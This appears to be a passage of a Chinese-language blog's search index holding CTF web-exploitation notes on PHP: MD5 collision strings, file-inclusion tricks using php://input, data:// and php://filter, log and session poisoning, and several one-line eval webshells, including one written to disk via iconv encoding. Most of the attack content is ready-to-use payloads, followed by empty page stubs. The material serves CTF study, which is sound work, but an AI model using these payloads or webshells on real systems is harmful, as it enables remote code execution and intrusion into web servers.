id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file()"></a>highlight_file()</h2><p>此函数可显示指定文件内容<br>可以用绝对路径，相对路径，php伪协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?u=/var/www/html/flag.php</span><br><span class="line">?u=./flag.php</span><br><span class="line">?u=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h2><p>md5无法处理数组<br>当有md5($a)&#x3D;&#x3D;&#x3D;md5($b)时<br>可以a[]&#x3D;1 &amp; b[]&#x3D;2绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure><h1 id="出现正则绕过可以使用这个进行简单的查看过滤字母是什么"><a href="#出现正则绕过可以使用这个进行简单的查看过滤字母是什么" class="headerlink" title="出现正则绕过可以使用这个进行简单的查看过滤字母是什么"></a>出现正则绕过可以使用这个进行简单的查看过滤字母是什么</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$a</span> = 0; <span class="variable">$a</span> &lt; 256; <span class="variable">$a</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,chr(<span class="variable">$a</span>)))&#123;</span><br><span class="line">        <span class="built_in">echo</span> chr(<span class="variable">$a</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP伪协议</title>
      <link href="/2023/05/23/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2023/05/23/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="使用命令查看"><a href="#使用命令查看" class="headerlink" title="使用命令查看"></a>使用命令查看</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://input   (包括Php绕过[大写])</span><br></pre></td></tr></table></figure><p>抓包post传参</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&quot;ls /&quot;</span>);?&gt;</span><br></pre></td></tr></table></figure><p>或者使用data查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?=system(<span class="string">&quot;ls /&quot;</span>)?&gt;</span><br></pre></td></tr></table></figure><h2 id="日志注入"><a href="#日志注入" class="headerlink" title="日志注入"></a>日志注入</h2><p>已知日志文件所在地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>抓包修改useragent为一句话木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_REQUEST</span>[1])?&gt;</span><br></pre></td></tr></table></figure><h2 id="关于session文件的注入"><a href="#关于session文件的注入" class="headerlink" title="关于session文件的注入"></a>关于session文件的注入</h2><p>服务器一般会将sessio文件放入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/</span><br><span class="line">/var/lib/php/sessions/</span><br><span class="line">/tmp/</span><br><span class="line">/tmp/sessions/</span><br></pre></td></tr></table></figure><p>直接在根目录下3.php使用post传参<br>(目前销毁session    删除tmp文件夹     过滤&lt;    设置包含路径 都可行)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&quot;cd var/www/html;tac fl0g.php&quot;</span>);   (类似即可)</span><br></pre></td></tr></table></figure><h2 id="data伪协议直接查看"><a href="#data伪协议直接查看" class="headerlink" title="data伪协议直接查看"></a>data伪协议直接查看</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;<span class="built_in">base64</span>,PD89c3lzdGVtKCd0YWMgZioucGhwJyk7   (<span class="built_in">base64</span>编码)</span><br></pre></td></tr></table></figure><h2 id="php伪协议写入一句话木马"><a href="#php伪协议写入一句话木马" class="headerlink" title="php伪协议写入一句话木马"></a>php伪协议写入一句话木马</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=3.php</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contents=&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[jz]);?&gt;</span><br></pre></td></tr></table></figure><p>如果有base64过滤则进行UCS-2LE编码转换为UCS-2BE编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$result</span> = iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[jz]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;payload:&quot;</span>.<span class="variable">$result</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="filter伪协议"><a href="#filter伪协议" class="headerlink" title="filter伪协议"></a>filter伪协议</h2><p>base64被过滤后的选择(集束炸弹bp爆破)<br>UCS-4*<br>UCS-4BE<br>UCS-4LE*<br>UCS-2<br>UCS-2BE<br>UCS-2LE<br>UTF-32*<br>UTF-32BE*<br>UTF-32LE*<br>UTF-16*<br>UTF-16BE*<br>UTF-16LE*<br>UTF-7<br>UTF7-IMAP<br>UTF-8*<br>ASCII*</p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友链</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>电影</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>音乐</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
